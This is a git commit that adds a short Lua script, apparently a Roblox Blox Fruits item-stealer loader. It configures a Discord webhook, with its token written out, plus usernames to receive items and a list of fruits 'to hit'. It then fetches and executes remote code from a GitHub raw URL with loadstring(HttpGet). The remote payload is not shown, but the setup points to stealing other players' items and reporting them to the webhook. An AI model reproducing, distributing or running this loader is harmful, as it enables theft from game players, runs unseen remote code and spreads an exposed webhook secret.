afd3841a52275b8bee61cae5559fa5f231fc01b1
Xzgss <justastiktokphoto@gmail.com>
2025-04-25 09:58:36 +0300

    Create xzgs.lua

---
+++ xzgs.lua
@@ -0,0 +1,5 @@
+Webhook = "https://discord.com/api/webhooks/1364865625981456426/eLoyfLPcF8tP9kfxbTvISNyO8i1kSnYS0Bj-BjOvt5GPILaePCZSdTACCW_-pv8hixRL" -- << Your Webhook
+Usernames = {"ImTheOneRobloxPlayer"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Buddha-Buddha", "Love-Love", "Venom-Venom", "Magma-Magma", "Gravity-Gravity"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
